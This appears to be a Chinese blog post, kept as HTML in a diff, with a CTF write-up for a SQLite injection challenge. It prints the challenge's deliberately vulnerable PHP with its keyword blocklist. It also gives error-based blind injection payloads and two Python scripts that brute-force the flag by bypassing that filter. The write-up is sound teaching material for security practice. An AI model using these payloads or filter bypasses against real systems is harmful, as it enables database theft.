@@ -1,0 +1,421 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"550532788.github.io","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="0x00 前言​    最近尝试了一下SQLite注入。发现不同的数据库中的差距是真的很大。这里记录一下吧。 测试题目: [HarekazeCTF2019]Sqlite Voting">
+<meta property="og:type" content="article">
+<meta property="og:title" content="从一道题目看绕过SQLite注入的关键字">
+<meta property="og:url" content="https://550532788.github.io/2020/08/10/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E7%9B%AE%E7%9C%8B%E7%BB%95%E8%BF%87SQLite%E6%B3%A8%E5%85%A5%E7%9A%84%E5%85%B3%E9%94%AE%E5%AD%97/index.html">
+<meta property="og:site_name" content="Cxlover&#39;s blog">
+<meta property="og:description" content="0x00 前言​    最近尝试了一下SQLite注入。发现不同的数据库中的差距是真的很大。这里记录一下吧。 测试题目: [HarekazeCTF2019]Sqlite Voting">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2020-08-10T09:44:15.449Z">
+<meta property="article:modified_time" content="2020-08-10T09:44:15.449Z">
+<meta property="article:author" content="Cxlover">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://550532788.github.io/2020/08/10/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E7%9B%AE%E7%9C%8B%E7%BB%95%E8%BF%87SQLite%E6%B3%A8%E5%85%A5%E7%9A%84%E5%85%B3%E9%94%AE%E5%AD%97/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>从一道题目看绕过SQLite注入的关键字 | Cxlover's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Cxlover's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section">Home</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section">Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://550532788.github.io/2020/08/10/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E7%9B%AE%E7%9C%8B%E7%BB%95%E8%BF%87SQLite%E6%B3%A8%E5%85%A5%E7%9A%84%E5%85%B3%E9%94%AE%E5%AD%97/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://blog-static.cnblogs.com/files/cioi/avatar.gif">
+      <meta itemprop="name" content="Cxlover">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Cxlover's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          从一道题目看绕过SQLite注入的关键字
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2020-08-10 17:44:15" itemprop="dateCreated datePublished" datetime="2020-08-10T17:44:15+08:00">2020-08-10</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a><code>0x00</code> 前言</h3><p>​    最近尝试了一下<code>SQLite</code>注入。发现不同的数据库中的差距是真的很大。这里记录一下吧。</p>
+<p>测试题目: <code>[HarekazeCTF2019]Sqlite Voting</code></p>
+<a id="more"></a>
+
+<h3 id="0x01-源码"><a href="#0x01-源码" class="headerlink" title="0x01 源码"></a><code>0x01</code> 源码</h3><p>​    题目是给了源码的。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'source'</span>])) &#123;</span><br><span class="line">  show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span><span class="params">($str)</span> </span>&#123;</span><br><span class="line">  $banword = [</span><br><span class="line">    <span class="comment">// dangerous chars</span></span><br><span class="line">    <span class="comment">// " % ' * + / &lt; = &gt; \ _ ` ~ -</span></span><br><span class="line">    <span class="string">"[\"%'*+\\/&lt;=&gt;\\\\_`~-]"</span>,</span><br><span class="line">    <span class="comment">// whitespace chars</span></span><br><span class="line">    <span class="string">'\s'</span>,</span><br><span class="line">    <span class="comment">// dangerous functions</span></span><br><span class="line">    <span class="string">'blob'</span>, <span class="string">'load_extension'</span>, <span class="string">'char'</span>, <span class="string">'unicode'</span>,</span><br><span class="line">    <span class="string">'(in|sub)str'</span>, <span class="string">'[lr]trim'</span>, <span class="string">'like'</span>, <span class="string">'glob'</span>, <span class="string">'match'</span>, <span class="string">'regexp'</span>,</span><br><span class="line">    <span class="string">'in'</span>, <span class="string">'limit'</span>, <span class="string">'order'</span>, <span class="string">'union'</span>, <span class="string">'join'</span></span><br><span class="line">  ];</span><br><span class="line">  $regexp = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $banword) . <span class="string">'/i'</span>;</span><br><span class="line">  <span class="keyword">if</span> (preg_match($regexp, $str)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">header(<span class="string">"Content-Type: text/json; charset=utf-8"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// check user input</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_POST[<span class="string">'id'</span>]) || <span class="keyword">empty</span>($_POST[<span class="string">'id'</span>])) &#123;</span><br><span class="line">  <span class="keyword">die</span>(json_encode([<span class="string">'error'</span> =&gt; <span class="string">'You must specify vote id'</span>]));</span><br><span class="line">&#125;</span><br><span class="line">$id = $_POST[<span class="string">'id'</span>];</span><br><span class="line"><span class="keyword">if</span> (!is_valid($id)) &#123;</span><br><span class="line">  <span class="keyword">die</span>(json_encode([<span class="string">'error'</span> =&gt; <span class="string">'Vote id contains dangerous chars'</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// update database</span></span><br><span class="line">$pdo = <span class="keyword">new</span> PDO(<span class="string">'sqlite:../db/vote.db'</span>);</span><br><span class="line">$res = $pdo-&gt;query(<span class="string">"UPDATE vote SET count = count + 1 WHERE id = $&#123;id&#125;"</span>);</span><br><span class="line"><span class="keyword">if</span> ($res === <span class="keyword">false</span>) &#123;</span><br><span class="line">  <span class="keyword">die</span>(json_encode([<span class="string">'error'</span> =&gt; <span class="string">'An error occurred while updating database'</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// succeeded!</span></span><br><span class="line"><span class="keyword">echo</span> json_encode([</span><br><span class="line">  <span class="string">'message'</span> =&gt; <span class="string">'Thank you for your vote! The result will be published after the CTF finished.'</span></span><br><span class="line">]);</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x02-分析"><a href="#0x02-分析" class="headerlink" title="0x02 分析"></a><code>0x02</code> 分析</h3><p>​    这里的正则过滤了很多东西。<code>\s</code>过滤了所有的空白字符。过滤的东西有点离谱。<code>&lt;=&gt;</code>全都被过滤了，在<code>mysql</code>中可以使用<code>regexp</code>或者<code>like</code>来实现sql盲注。而在<code>sqlite</code>中没有这种阴间操作。我们要使用别的方法来实现<code>sql</code>注入。</p>
+<p>​    这里提出一个<code>SQLite</code>的特性。我们可以使用<code>abs(0x8000000000000000)</code>来爆出<code>{&quot;error&quot;:&quot;An error occurred while updating database&quot;}</code>的错误。</p>
+<p>PS：但是0x8000000000000000这个数字不能太大。如果太大的话，可能直接就会爆出错误，导致我们的语句一直执行不正确。</p>
+<p>​    这里提供一种非常阴间的方法：使用<code>&amp;</code>操作符来一位一位的爆破。</p>
+<p>​    另外在无法确定回显的情况下，我们可以使用<code>abs(0x8000000000000000)</code>来爆出错误。同时使用<code>case when then else end</code>来完成。</p>
+<p>​    这里可以使用<code>abs(case(length(hex(select(flag)from(flag)))&amp;2)when(0)then(0)else(0x8000000000000000000000000)end)</code>这种方式来判断flag的长度。</p>
+<p>PS:这里重点提醒一下。在<code>bp</code>中要把<code>&amp;</code>先编码。</p>
+<p>​    这里贴一下爆破脚本。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">URL = <span class="string">'http://fb2c4efd-6de8-475a-b85c-c31505ea598e.node3.buuoj.cn/vote.php'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># フラグの長さを特定</span></span><br><span class="line">l = <span class="number">0</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">    r = requests.post(URL, data=&#123;</span><br><span class="line">        <span class="string">'id'</span>: <span class="string">f'abs(case(length(hex((select(flag)from(flag))))&amp;<span class="subst">&#123;<span class="number">1</span> &lt;&lt; j&#125;</span>)when(0)then(0)else(0x8000000000000000)end)'</span></span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b'An error occurred'</span> <span class="keyword">in</span> r.content:</span><br><span class="line">        l |= <span class="number">1</span> &lt;&lt; j</span><br><span class="line">print(<span class="string">'[+] length:'</span>, l)</span><br><span class="line"></span><br><span class="line"><span class="comment"># A-F のテーブルを作成</span></span><br><span class="line">table = &#123;&#125;</span><br><span class="line">table[<span class="string">'A'</span>] = <span class="string">'trim(hex((select(name)from(vote)where(case(id)when(3)then(1)end))),12567)'</span></span><br><span class="line">table[<span class="string">'C'</span>] = <span class="string">'trim(hex(typeof(.1)),12567)'</span></span><br><span class="line">table[<span class="string">'D'</span>] = <span class="string">'trim(hex(0xffffffffffffffff),123)'</span></span><br><span class="line">table[<span class="string">'E'</span>] = <span class="string">'trim(hex(0.1),1230)'</span></span><br><span class="line">table[<span class="string">'F'</span>] = <span class="string">'trim(hex((select(name)from(vote)where(case(id)when(1)then(1)end))),467)'</span></span><br><span class="line">table[<span class="string">'B'</span>] = <span class="string">f'trim(hex((select(name)from(vote)where(case(id)when(4)then(1)end))),16||<span class="subst">&#123;table[<span class="string">"C"</span>]&#125;</span>||<span class="subst">&#123;table[<span class="string">"F"</span>]&#125;</span>)'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># フラグをゲット!</span></span><br><span class="line">res = binascii.hexlify(<span class="string">b'flag&#123;'</span>).decode().upper()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(res), l):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">'0123456789ABCDEF'</span>:</span><br><span class="line">        t = <span class="string">'||'</span>.join(c <span class="keyword">if</span> c <span class="keyword">in</span> <span class="string">'0123456789'</span> <span class="keyword">else</span> table[c] <span class="keyword">for</span> c <span class="keyword">in</span> res + x)</span><br><span class="line">        r = requests.post(URL, data=&#123;</span><br><span class="line">            <span class="string">'id'</span>: <span class="string">f'abs(case(replace(length(replace(hex((select(flag)from(flag))),<span class="subst">&#123;t&#125;</span>,trim(0,0))),<span class="subst">&#123;l&#125;</span>,trim(0,0)))when(trim(0,0))then(0)else(0x8000000000000000)end)'</span></span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b'An error occurred'</span> <span class="keyword">in</span> r.content:</span><br><span class="line">            res += x</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    print(<span class="string">f'[+] flag (<span class="subst">&#123;i&#125;</span>/<span class="subst">&#123;l&#125;</span>): <span class="subst">&#123;res&#125;</span>'</span>)</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">print(<span class="string">'[+] flag:'</span>, binascii.unhexlify(res).decode())</span><br></pre></td></tr></table></figure>
+
+<p>​    这里我们使用<code>replace</code>来判断十六进制的<code>flag</code>中是否有相同的字符。基本原理是用replace将已知的flag部分替换为空，通过长度变化与否一位一位爆出来。考虑下面的代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ sqlite3</span><br><span class="line">︙</span><br><span class="line">sqlite&gt; create table flag (flag text);</span><br><span class="line">sqlite&gt; insert into flag values (&#39;HarekazeCTF&#123;test&#125;&#39;);</span><br><span class="line">sqlite&gt; select length(replace(flag, &#39;HarekazeCTF&#123;a&#39;, &#39;&#39;)) from flag;</span><br><span class="line">17</span><br><span class="line">sqlite&gt; select length(replace(flag, &#39;HarekazeCTF&#123;b&#39;, &#39;&#39;)) from flag;</span><br><span class="line">17</span><br><span class="line">︙</span><br><span class="line">sqlite&gt; select length(replace(flag, &#39;HarekazeCTF&#123;s&#39;, &#39;&#39;)) from flag;</span><br><span class="line">17</span><br><span class="line">sqlite&gt; select length(replace(flag, &#39;HarekazeCTF&#123;t&#39;, &#39;&#39;)) from flag;</span><br><span class="line">4</span><br></pre></td></tr></table></figure>
+
+<p>​    简单解释一下这个脚本的意思。其实<code>||</code>在<code>SQLite</code>中是链接的意思，这里还从原本的数据库中取出了<code>A~F</code>。但是其实不需要这样的，我们可以两次<code>hex</code>编码，这样就不会出现字母了。</p>
+<p>​    下面是我稍微修改之后的脚本。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">URL = <span class="string">'http://9f623b32-d387-4db1-995d-6297852dd2bd.node3.buuoj.cn/vote.php'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># フラグの長さを特定</span></span><br><span class="line">l = <span class="number">0</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">    r = requests.post(URL, data=&#123;</span><br><span class="line">        <span class="string">'id'</span>: <span class="string">f'abs(case(length(hex(hex((select(flag)from(flag)))))&amp;<span class="subst">&#123;<span class="number">1</span> &lt;&lt; j&#125;</span>)when(0)then(0)else(0x8000000000000000)end)'</span></span><br><span class="line">    &#125;)</span><br><span class="line">    print(r.text)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b'An error occurred'</span> <span class="keyword">in</span> r.content:</span><br><span class="line">        l |= <span class="number">1</span> &lt;&lt; j</span><br><span class="line">print(<span class="string">'[+] length:'</span>, l)</span><br><span class="line"></span><br><span class="line"><span class="comment"># A-F のテーブルを作成</span></span><br><span class="line"><span class="comment">#没必要这么搞。</span></span><br><span class="line">table = &#123;&#125;</span><br><span class="line">table[<span class="string">'A'</span>] = <span class="string">'trim(hex((select(name)from(vote)where(case(id)when(3)then(1)end))),12567)'</span></span><br><span class="line">table[<span class="string">'C'</span>] = <span class="string">'trim(hex(typeof(.1)),12567)'</span></span><br><span class="line">table[<span class="string">'D'</span>] = <span class="string">'trim(hex(0xffffffffffffffff),123)'</span></span><br><span class="line">table[<span class="string">'E'</span>] = <span class="string">'trim(hex(0.1),1230)'</span></span><br><span class="line">table[<span class="string">'F'</span>] = <span class="string">'trim(hex((select(name)from(vote)where(case(id)when(1)then(1)end))),467)'</span></span><br><span class="line">table[<span class="string">'B'</span>] = <span class="string">f'trim(hex((select(name)from(vote)where(case(id)when(4)then(1)end))),16||<span class="subst">&#123;table[<span class="string">"C"</span>]&#125;</span>||<span class="subst">&#123;table[<span class="string">"F"</span>]&#125;</span>)'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># フラグをゲット!</span></span><br><span class="line">res = binascii.hexlify(<span class="string">b'flag&#123;'</span>).decode().upper()</span><br><span class="line">res = <span class="string">'36363643363136373742'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(res), l):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">'0123456789'</span>:</span><br><span class="line">        t = <span class="string">'||'</span>.join(c <span class="keyword">if</span> c <span class="keyword">in</span> <span class="string">'0123456789'</span> <span class="keyword">else</span> table[c] <span class="keyword">for</span> c <span class="keyword">in</span> res + x)</span><br><span class="line">        r = requests.post(URL, data=&#123;</span><br><span class="line">            <span class="string">'id'</span>: <span class="string">f'abs(case(replace(length(replace(hex(hex((select(flag)from(flag)))),<span class="subst">&#123;t&#125;</span>,trim(0,0))),<span class="subst">&#123;l&#125;</span>,trim(0,0)))when(trim(0,0))then(0)else(0x8000000000000000)end)'</span></span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b'An error occurred'</span> <span class="keyword">in</span> r.content:</span><br><span class="line">            print(<span class="string">f'abs(case(replace(length(replace(hex(hex((select(flag)from(flag)))),<span class="subst">&#123;t&#125;</span>,trim(0,0))),<span class="subst">&#123;l&#125;</span>,trim(0,0)))when(trim(0,0))then(0)else(0x8000000000000000)end)'</span>)</span><br><span class="line">            res += x</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    print(<span class="string">f'[+] flag (<span class="subst">&#123;i&#125;</span>/<span class="subst">&#123;l&#125;</span>): <span class="subst">&#123;res&#125;</span>'</span>)</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">print(<span class="string">'[+] flag:'</span>, binascii.unhexlify(res).decode())</span><br></pre></td></tr></table></figure>
+
+<p>​    会输出<code>flag</code>经过十六进制编码后的结果。</p>
+<h3 id="0x03-参考"><a href="#0x03-参考" class="headerlink" title="0x03 参考"></a><code>0x03</code> 参考</h3><p><code>学习SQLite注入</code>:</p>
+<p><a href="http://atta.cked.me/home/sqlite3injectioncheatsheet" target="_blank" rel="noopener">http://atta.cked.me/home/sqlite3injectioncheatsheet</a></p>
+<p>​    </p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/08/10/SQLite%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/" rel="prev" title="SQLite基础学习">
+      <i class="fa fa-chevron-left"></i> SQLite基础学习
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x00-前言"><span class="nav-number">1.</span> <span class="nav-text">0x00 前言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-源码"><span class="nav-number">2.</span> <span class="nav-text">0x01 源码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-分析"><span class="nav-number">3.</span> <span class="nav-text">0x02 分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-参考"><span class="nav-number">4.</span> <span class="nav-text">0x03 参考</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Cxlover"
+      src="https://blog-static.cnblogs.com/files/cioi/avatar.gif">
+  <p class="site-author-name" itemprop="name">Cxlover</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">8</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+  </nav>
+</div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://xzlang.github.io/" title="https:&#x2F;&#x2F;xzlang.github.io&#x2F;" rel="noopener" target="_blank">Xzlang's Blog</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://0xdktb.top/" title="http:&#x2F;&#x2F;0xdktb.top&#x2F;" rel="noopener" target="_blank">0xDktb's Blog</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://www.d3vil.top/" title="http:&#x2F;&#x2F;www.d3vil.top&#x2F;" rel="noopener" target="_blank">d3vil's  Blog</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Cxlover</span>
+</div>
+<!--  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a>
+  </div>
+  -->
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+    <script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+  
